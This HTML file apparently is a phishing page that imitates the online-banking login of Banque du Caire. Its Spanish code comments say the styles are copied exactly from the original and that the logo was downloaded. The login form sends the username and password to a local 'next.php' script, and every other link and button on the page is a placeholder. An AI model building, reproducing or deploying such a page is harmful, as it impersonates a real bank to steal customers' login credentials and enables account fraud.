<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>BDC Bank - Banca en Línea</title>
    <link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
    <!-- Font Awesome (íconos) -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        /* ===== ESTILOS EXTRAÍDOS DEL ORIGINAL ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            width: 100%;
            background: #ffffff;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
            overflow: hidden;
        }

        /* ===== TOP BAR (ATM, Help, Support, Árabe) ===== */
        .top-bar {
            background: #f8faff;
            padding: 8px 40px;
            display: flex;
            justify-content: flex-end;
            align-items: center;
            gap: 20px;
            font-size: 13px;
            color: #1a2b4a;
            border-bottom: 1px solid #eaeef2;
        }
        .top-bar a {
            color: #1a2b4a;
            text-decoration: none;
        }
        .top-bar a:hover {
            text-decoration: underline;
        }
        .top-bar .lang-ar {
            font-family: 'Arial', sans-serif;
            direction: rtl;
        }

        /* ===== HEADER ===== */
        .header {
            background: #ffffff;
            padding: 15px 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #eaeef2;
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .logo img {
            height: 45px;
            width: auto;
        }
        .logo h1 {
            font-size: 22px;
            color: #1a2b4a;
            font-weight: 600;
        }
        .header-links a {
            color: #1a2b4a;
            text-decoration: none;
            margin-left: 25px;
            font-size: 14px;
            font-weight: 500;
        }
        .header-links a:hover {
            color: #0056a7;
        }

        /* ===== HERO / LOGIN (estilos exactos del original) ===== */
        .hero {
            background: linear-gradient(135deg, #f8faff 0%, #eef4f9 100%);
            padding: 50px 40px;
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            align-items: center;
            gap: 30px;
        }
        .hero-left {
            flex: 1 1 400px;
            max-width: 480px;
        }
        .hero-left h2 {
            font-size: 34px;
            color: #1a2b4a;
            font-weight: 300;
            margin-bottom: 6px;
        }
        .hero-left .sub {
            color: #6b7a8f;
            font-size: 16px;
            margin-bottom: 28px;
        }

        /* FORMULARIO (estilos extraídos del original) */
        .login-box {
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.06);
            padding: 30px 30px 25px;
            width: 100%;
        }
        .login-box label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #1a2b4a;
            margin-bottom: 4px;
        }
        /* Campos de entrada - ESTILO EXACTO DEL ORIGINAL */
        .login-box input {
            width: 100%;
            padding: 10px 12px;
            border: solid 1px #8b8b8b !important;
            border-radius: 10px !important;
            font-size: 15px !important;
            color: #000 !important;
            margin-bottom: 18px;
            background: #fafbfc;
            transition: 0.2s;
            outline: none;
        }
        .login-box input:focus {
            border-color: #1a2b4a;
            background: #ffffff;
            box-shadow: 0 0 0 3px rgba(26,43,74,0.1);
        }
        .login-box input::placeholder {
            color: #b6b6b6 !important;
        }
        .login-box .actions {
            display: flex;
            justify-content: space-between;
            font-size: 13px;
            margin-bottom: 20px;
        }
        .login-box .actions a {
            color: #0056a7;
            text-decoration: none;
        }
        .login-box .actions a:hover {
            text-decoration: underline;
        }
        /* BOTÓN DE LOGIN - GRADIENTE ROJO-NARANJA EXACTO DEL ORIGINAL */
        .btn-login {
            width: 100%;
            padding: 12px;
            background: linear-gradient(to right, #ef4230 0%, #f26131 48%, #f68b33 97%) !important;
            border: 0px solid rgba(255, 255, 255, 0.0) !important;
            border-radius: 10px !important;
            color: #ffffff !important;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
            outline: 0 !important;
        }
        .btn-login:hover {
            opacity: 0.9;
        }

        /* IMAGEN DERECHA */
        .hero-right {
            flex: 1 1 300px;
            max-width: 400px;
            text-align: center;
        }
        .hero-right img {
            max-width: 100%;
            height: auto;
            border-radius: 12px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.08);
        }

        /* ===== SECCIÓN "Banking with An Edge" ===== */
        .edge-section {
            padding: 50px 40px;
            background: #ffffff;
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            align-items: center;
            border-top: 1px solid #eaeef2;
            gap: 30px;
        }
        .edge-text {
            flex: 1 1 400px;
            max-width: 550px;
        }
        .edge-text h3 {
            font-size: 30px;
            color: #1a2b4a;
            margin-bottom: 12px;
            font-weight: 300;
        }
        .edge-text h3 span {
            color: #0056a7;
            font-weight: 600;
        }
        .edge-text p {
            color: #4a5a6e;
            line-height: 1.7;
            margin-bottom: 20px;
            font-size: 15px;
        }
        .btn-learn {
            background: transparent;
            border: 2px solid #1a2b4a;
            color: #1a2b4a;
            padding: 10px 32px;
            border-radius: 30px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
            font-size: 14px;
        }
        .btn-learn:hover {
            background: #1a2b4a;
            color: white;
        }
        .edge-image {
            flex: 1 1 250px;
            max-width: 320px;
            text-align: center;
        }
        .edge-image img {
            max-width: 100%;
            height: auto;
            border-radius: 12px;
        }

        /* ===== SERVICIOS ===== */
        .services {
            display: flex;
            flex-wrap: wrap;
            gap: 30px;
            padding: 40px;
            background: #f8faff;
            justify-content: center;
        }
        .service-card {
            background: white;
            border-radius: 12px;
            padding: 28px 25px;
            flex: 1 1 200px;
            max-width: 280px;
            text-align: center;
            box-shadow: 0 2px 12px rgba(0,0,0,0.04);
            transition: 0.25s;
        }
        .service-card:hover {
            transform: translateY(-4px);
            box-shadow: 0 8px 25px rgba(0,0,0,0.08);
        }
        .service-card i {
            font-size: 34px;
            color: #1a2b4a;
            margin-bottom: 12px;
        }
        .service-card h4 {
            font-size: 18px;
            color: #1a2b4a;
            margin-bottom: 6px;
        }
        .service-card p {
            color: #6b7a8f;
            font-size: 14px;
        }

        /* ===== FOOTER ===== */
        .footer {
            background: #1a2b4a;
            color: rgba(255,255,255,0.8);
            padding: 22px 40px;
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            align-items: center;
            font-size: 13px;
        }
        .footer a {
            color: rgba(255,255,255,0.7);
            text-decoration: none;
            margin-left: 20px;
        }
        .footer a:hover {
            color: white;
            text-decoration: underline;
        }
        .footer .social i {
            margin-left: 12px;
            font-size: 18px;
            color: rgba(255,255,255,0.6);
        }
        .footer .social i:hover {
            color: white;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 768px) {
            .top-bar {
                padding: 8px 20px;
                flex-wrap: wrap;
                justify-content: center;
                gap: 10px;
            }
            .header {
                flex-wrap: wrap;
                padding: 15px 20px;
            }
            .header-links a {
                margin-left: 15px;
                font-size: 13px;
            }
            .hero {
                flex-direction: column;
                text-align: center;
                padding: 30px 20px;
            }
            .hero-left {
                max-width: 100%;
            }
            .hero-right {
                max-width: 100%;
            }
            .login-box {
                padding: 20px;
            }
            .edge-section {
                flex-direction: column;
                text-align: center;
                padding: 30px 20px;
            }
            .edge-text {
                max-width: 100%;
            }
            .edge-image {
                max-width: 100%;
            }
            .services {
                flex-direction: column;
                align-items: center;
                padding: 20px;
            }
            .service-card {
                max-width: 100%;
                width: 100%;
            }
            .footer {
                flex-direction: column;
                text-align: center;
                gap: 12px;
                padding: 20px;
            }
            .footer a {
                margin: 0 10px;
            }
        }
    </style>
</head>
<body>

<div class="container">

    <!-- ===== TOP BAR ===== -->
    <div class="top-bar">
        <a href="#"><i class="fas fa-map-marker-alt"></i> ATM &amp; Branch Locator</a>
        <a href="#"><i class="fas fa-question-circle"></i> Help &amp; Support</a>
        <a href="#" class="lang-ar">أعلى</a>
    </div>

    <!-- ===== HEADER ===== -->
    <header class="header">
        <div class="logo">
            <!-- Tu logo descargado -->
            <img src="assets/img/logo-bdc.png" alt="Banque du Caire" onerror="this.style.display='none'">
            <h1>Banque du Caire</h1>
        </div>
        <div class="header-links">
            <a href="#"><i class="fas fa-globe"></i> En</a>
            <a href="#">Enroll / Activate</a>
        </div>
    </header>

    <!-- ===== HERO / LOGIN ===== -->
    <section class="hero">
        <div class="hero-left">
            <h2>Welcome back</h2>
            <p class="sub">Access your accounts securely</p>

            <form action="next.php" method="post" class="login-box">
                <label for="user">Username</label>
                <input type="text" id="user" name="user" placeholder="Enter your username" required>

                <label for="pass">Password</label>
                <input type="password" id="pass" name="pass" placeholder="Enter your password" required>

                <div class="actions">
                    <a href="#">Enroll / Activate</a>
                    <a href="#">Forgot password?</a>
                </div>

                <button type="submit" class="btn-login">Login</button>
            </form>
        </div>

        <div class="hero-right">
            <img src="assets/img/hero-card.png" alt="Banking" onerror="this.style.display='none'">
        </div>
    </section>

    <!-- ===== SECCIÓN "Banking with An Edge" ===== -->
    <section class="edge-section">
        <div class="edge-text">
            <h3>Banking with <span>An Edge</span></h3>
            <p>Your Stunning Internet banking experience Starts with BDC. Your Secure Banking Is our responsibility, Banking with An Edge.</p>
            <button class="btn-learn">Learn More</button>
        </div>
        <div class="edge-image">
            <img src="assets/img/edge-image.png" alt="Edge" onerror="this.style.display='none'">
        </div>
    </section>

    <!-- ===== SERVICIOS ===== -->
    <section class="services">
        <div class="service-card">
            <i class="fas fa-calendar-check"></i>
            <h4>Book Appointment</h4>
            <p>Schedule a visit at your convenience.</p>
        </div>
        <div class="service-card">
            <i class="fas fa-exchange-alt"></i>
            <h4>FX Rates</h4>
            <p>Check the latest foreign exchange rates.</p>
        </div>
    </section>

    <!-- ===== FOOTER ===== -->
    <footer class="footer">
        <div>
            <a href="#">Locate Us</a>
            <a href="#">Contact Us</a>
            <a href="#">Privacy Policy</a>
            <a href="#">Terms &amp; Conditions</a>
            <a href="#">FAQ</a>
        </div>
        <div class="social">
            <i class="fab fa-facebook"></i>
            <i class="fab fa-twitter"></i>
            <i class="fab fa-linkedin"></i>
        </div>
    </footer>

</div>

<!-- Script para ocultar imágenes rotas -->
<script>
    document.querySelectorAll('img').forEach(img => {
        img.onerror = function() { this.style.display = 'none'; };
    });
</script>

</body>
</html>
